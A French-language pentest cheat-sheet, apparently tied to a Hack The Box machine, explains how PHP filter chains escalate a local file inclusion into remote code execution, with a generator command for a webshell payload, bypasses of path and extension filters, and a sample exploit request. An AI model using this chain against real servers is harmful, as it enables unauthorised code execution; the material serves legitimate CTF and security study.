# PHP Filter Chain — LFI → RCE

## <mark style="color:red;">🔗 PHP Filter Chain — LFI → RCE</mark>

### <mark style="color:blue;">🧠 Concept</mark>

Une **LFI (Local File Inclusion)** permet de faire inclure un fichier arbitraire via `require`/`include`. Seule, elle ne suffit pas à exécuter du code. Les **PHP filter chains** permettent de transformer cette primitive en **RCE complète**, sans avoir besoin d'un fichier existant sur le serveur.

***

### <mark style="color:blue;">⚙️ Prérequis</mark>

| Condition                                 | Détail                                                         |
| ----------------------------------------- | -------------------------------------------------------------- |
| Primitive `include`/`require` contrôlable | Le paramètre passé à `require($routes)` est attaquant-contrôlé |
| PHP avec support iconv                    | Activé par défaut sur la plupart des serveurs                  |
| Pas besoin de fichier sur le serveur      | `php://temp` suffit                                            |

***

### <mark style="color:blue;">🔍 Pourquoi ça marche</mark>

#### 1. `php://filter` applique des transformations sur un flux

```
php://filter/filtre1|filtre2|filtre3/resource=SOURCE
```

PHP lit `SOURCE`, applique les filtres dans l'ordre, et retourne le résultat. Si ce résultat est du code PHP valide et que la lecture se fait via `require`, **PHP l'exécute**.

#### 2. `php://temp` comme source vide

```php
require('php://filter/.../resource=php://temp');
```

`php://temp` est un fichier temporaire **vide en mémoire**. Pas besoin de deviner un chemin valide sur le serveur, pas de contrainte `open_basedir`.

#### 3. Les encodages `iconv` permettent de générer des caractères

Certaines conversions d'encodage **ajoutent automatiquement des octets** au début d'une chaîne :

| Encodage      | Octets ajoutés     |
| ------------- | ------------------ |
| `CSISO2022KR` | `\x1b$)C`          |
| `UTF-16`      | `\xff\xfe` (BOM)   |
| `UTF-32`      | `\xff\xfe\x00\x00` |

En chaînant plusieurs conversions, on peut faire apparaître **n'importe quel octet** en tête de chaîne.

#### 4. Le base64 sert de couche de protection et d'intégration

| Rôle            | Explication                                                      |
| --------------- | ---------------------------------------------------------------- |
| `base64-encode` | Protège les caractères déjà construits des conversions suivantes |
| `base64-decode` | Intègre les nouveaux octets dans le payload réel                 |
| `UTF7`          | Supprime les `=` qui cassent le décodeur base64 de PHP           |

Le base64 PHP **ignore les caractères invalides** → les octets parasites produits par iconv sont automatiquement filtrés.

***

### <mark style="color:blue;">🔄 Cycle de construction (par caractère)</mark>

```
État actuel : payload en base64 (ex: "Zw==")
      |
      | iconv ajoute les bons octets devant
      ↓
"YgZw==" (octets correspondant à 'b' + contenu précédent)
      |
      | base64-decode
      ↓
\x62\x67... (= "bg" en octets)
      |
      | base64-encode
      ↓
"YmI=" (nouveau base64 propre incluant 'b')
      |
      | Répéter pour le caractère suivant...
```

À la fin, un `base64-decode` final produit le code PHP brut, que `require` exécute.

***

### <mark style="color:blue;">🛠️ Exploitation pratique</mark>

#### Générer la chaîne

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

Résultat : une URL `php://filter/...` de \~14Ko.

#### Bypass de filtres courants

**Filtre anti-`..`**

```php
if (strpos($report, '..') !== false) die("Blocked");
```

→ `php://filter` ne contient aucun `..` ✅

**Filtre regex sur l'extension**

```php
if (!preg_match('/^(.*(enrollment|academic)\.php)$/', $report)) die("Blocked");
```

→ Terminer la resource par le nom attendu :

```
resource=reports/enrollment.php
```

La chaîne complète se lit ainsi :

```
php://filter/[...conversions...]/resource=reports/enrollment.php
```

#### Requête finale (exemple HTB Guardian)

```
GET /admin/reports.php?report=php://filter/convert.iconv.UTF8.CSISO2022KR|...[chaîne]...|convert.base64-decode/resource=reports/enrollment.php&cmd=id
```

***

### <mark style="color:blue;">⚠️ Limites</mark>

| Limite                | Détail                                                     |
| --------------------- | ---------------------------------------------------------- |
| Taille du payload     | \~14Ko → dépasse la limite Apache par défaut (8Ko headers) |
| NGINX                 | OK par défaut (limite 16Ko)                                |
| Optimisation possible | Les payloads peuvent encore être réduits                   |

***

### 🔗 <mark style="color:blue;">Ressources</mark>

* Script : [php\_filter\_chain\_generator](https://github.com/synacktiv/php_filter_chain_generator)
* Article Synacktiv : https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it
* RFC ISO-2022-KR : https://www.rfc-editor.org/rfc/rfc1557.html
